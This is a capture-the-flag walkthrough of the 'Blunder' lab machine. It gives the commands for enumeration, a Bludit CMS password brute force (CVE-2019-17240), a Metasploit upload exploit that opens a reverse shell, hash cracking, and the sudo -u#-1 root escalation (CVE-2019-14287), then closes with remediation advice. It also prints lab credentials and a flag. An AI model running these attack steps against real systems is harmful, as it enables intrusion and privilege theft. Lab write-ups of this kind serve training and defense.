<img width="699" height="659" alt="image" src="https://github.com/user-attachments/assets/a4effd77-930d-48c0-9007-949d91856c04" />

# Blunder Walkthrough: From Foothold to Root

> Machine: Blunder
Difficulty: Easy
Tech Stack: Bludit CMS 3.9.2 & 3.10.0a
Exploits Used: Brute-force login, PHP upload bypass, CVE-2019-14287 (sudo bypass)
> 

> *How many TCP ports are open on the remote host?*
> 

### Nmap service scan (summary)

Command used:

nmap -sV 10.129.95.225

<img width="882" height="222" alt="image" src="https://github.com/user-attachments/assets/a34f208c-2cb5-48a4-a017-19192b9ebdc3" />

Observed:

- **Ports:** 80/tcp open — Apache httpd 2.4.41 (Ubuntu)
- Other common TCP ports were filtered or closed in the scan output.

> *What is the name of the unusual file that dirbusting reveals?*
> 

## Web enumeration (gobuster)

Command used:`gobuster dir -u [http://10.129.95.225](http://10.129.95.225/) -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,pdf`

<img width="1237" height="775" alt="image" src="https://github.com/user-attachments/assets/2936d2a1-66ba-4c03-8a69-ab0feee4d957" />

Notable findings:

- `/admin` -> redirected to `/admin/`
- `/install.php` — present (small file)
- `/robots.txt` — present
- `/todo.txt` — **unusual file** discovered and readable (size 118)

**Answer:** **todo.txt**

> *What is the version of Bludit CMS that is used?*
> 

By inspecting the source code we can se what version is running

<img width="1389" height="126" alt="image" src="https://github.com/user-attachments/assets/a0da0d92-f168-4641-8e36-7222074ffb6b" />

**Answer:** **3.9.2**

> *What is the password for the user "fergus" on Bludit CMS?*
> 

Using `cewl` to create a wordlist from the site and a PoC bruteforce script for CVE-2019-17240, the login for the user `fergus` was found:

```php
git clone https://github.com/0xDTC/Bludit-3.9.2-Auth-Bruteforce-Bypass-CVE-2019-17240.git
cd Bludit-3.9.2-Auth-Bruteforce-Bypass-CVE-2019-17240
chmod +x CVE-2019-17240
cewl http://10.129.95.225 -w bludit_words.txt
bash CVE-2019-17240 -u http://10.129.95.225/admin/login -U fergus -w bludit_words.txt
```

<img width="1195" height="248" alt="image" src="https://github.com/user-attachments/assets/491af63a-37c5-458c-ba4e-3dc783c3987d" />

- **Username:** `fergus`
- **Password:** `RolandDeschain`

<img width="906" height="174" alt="image" src="https://github.com/user-attachments/assets/7eb08355-098a-4daa-93ae-fa94b85e030f" />

the username actually can be found in todo.txt

**Answer:** **RolandDeschain**

Notes: CVE-2019-17240 is an authentication-related issue that allows bypassing protections under certain conditions — in this test a site-specific wordlist helped find the password.

> *What is the 2019 CVE ID for a remote code execution vulnerability in Bludit 3.9.2?*
> 

<img width="830" height="358" alt="image" src="https://github.com/user-attachments/assets/f0dc0fb3-e88d-4872-8b99-c139e14e6f9e" />

**Answer:** **CVE-2019-16113**

> *What is the password of the user Hugo?*
> 

## Exploitation (Bludit image upload RCE)

Module used: `linux/http/bludit_upload_images_exec` (Metasploit)

High-level steps performed (commands paraphrased):

1. Start msfconsole
2. `use linux/http/bludit_upload_images_exec`
3. Set `RHOSTS`, `RPORT`, `LHOST`,`LPORT`,`BLUDITUSER` and `BLUDITPASS` appropriately
4. Run the exploit; it logged in as `fergus`, uploaded a crafted image and .htaccess, got a PHP reverse shell and a Meterpreter session

<img width="1134" height="803" alt="image" src="https://github.com/user-attachments/assets/ad483da9-4724-48dd-94b6-c6f4e709e65f" />

## Local discovery on host

After getting a shell (`www-data`), the following observations were made by enumerating `/var/www` and Bludit content directories:

<img width="1147" height="833" alt="image" src="https://github.com/user-attachments/assets/699a7649-123f-4aca-b01b-4bbbf3eb0d60" />

- Two Bludit directories were present: `bludit-3.10.0a` and `bludit-3.9.2` (the site content used the 3.9.2 content layout)
- The Bludit `databases/users.php` file contained the admin user entry with a hashed password for `Hugo` (nick: Hugo).

Snippet (observed from `users.php`

grab the sha and crack it using online tool

<img width="1048" height="380" alt="image" src="https://github.com/user-attachments/assets/f0c35428-6391-434c-b013-9fd766b13634" />

Answer: **Password120**

> *Submit the flag located in the hugo user's home directory.*
> 

after got the credential of huga use it to log as hugo

<img width="1118" height="292" alt="image" src="https://github.com/user-attachments/assets/b0e1500e-fcbe-4cb8-b7d7-c94300c975de" />

we got the flag!

> *What 2019 CVE ID is related to the currently installed Sudo version?*
> 

<img width="743" height="475" alt="image" src="https://github.com/user-attachments/assets/aadcaeec-6807-429d-af95-8cb42d0420ce" />

Answer : **CVE-2019-14287**

## privilege escalation to root

On Hugo’s account we ran `sudo -V` and `sudo -l`

<img width="1140" height="317" alt="image" src="https://github.com/user-attachments/assets/14e45c6d-bd84-4759-8aa7-f9c924a5dd17" />

On Hugo’s account we ran `sudo -V` and `sudo -l`.

Observed sudo version:

Sudo version 1.8.25p1

This version is associated with a known issue where a user who can run commands as `ALL, !root` may still abuse `sudo -u#-1` (UID -1 / 4294967295) to run commands as root 

`sudo -l` output showed Hugo may run: `(ALL, !root) /bin/bash` which allowed abuse using `sudo -u#-1 /bin/bash` to obtain root

<img width="1139" height="665" alt="image" src="https://github.com/user-attachments/assets/96c4d237-a2d3-4a30-a021-6ef561e62fb1" />

After running that, `whoami` returned `root` and `root.txt` was read:

`cat /root/root.txt`

**Flag (root):** `3302c87e063ac364ca013f53cdb632db`

## Impact

- Full compromise of web application allowed remote code execution and arbitrary file upload.
- Local credentials and application data led to local privilege escalation to root.
- Both user and root flags were obtained.

---

## Remediation & Mitigation Recommendations

1. **Patch Bludit** to a version without the upload/auth vulnerabilities (update immediately from vendor and remove unused demo/install scripts).
2. **Harden uploads:** validate file uploads strictly, restrict .php execution in upload directories, and review .htaccess rules.
3. **Least privilege:** avoid storing production admin credentials in predictable files and restrict access to `bl-content/databases/*` files.
4. **Sudo policy:** fix sudoers entries so no `ALL, !root` ambiguous rules exist. Upgrade `sudo` to a version where `CVE-2019-14287` is patched and remove wildcard `ALL, !root` usages. Replace `ALL, !root` allowances with explicit required commands or limit to specific UIDs.
5. **Monitoring & detection:** enable web application monitoring, file integrity checks, and alerting on suspicious uploads or new web shells.
